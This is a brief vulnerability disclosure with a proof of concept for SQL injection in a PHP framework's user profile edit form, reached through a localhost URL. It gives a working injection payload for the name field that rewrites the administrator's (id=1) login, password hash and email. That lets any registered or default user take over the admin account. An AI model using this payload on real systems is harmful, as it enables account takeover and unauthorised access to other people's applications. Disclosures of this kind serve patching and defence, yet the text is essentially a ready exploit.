The failure allows any ordinary user to enter SQL Injection and take over the administrator account or any other user of the system,
by editing the profile itself.



POC:

1-Register an ordinary user or use the framework standard(user=user password=user)

2- Access the user profile and click edit http://localhost/template/index.php?class=SystemProfileForm&method=onEdit

3- In the field name enter SQL injection and click Save:

(SELECT 'hackeado'),login=(SELECT 'anonymous'),password=(SELECT '294de3557d9d00b3d2d8a1e6aab028cf'),email=(SELECT 'anonymous@anonymous.com')WHERE `id`=1#
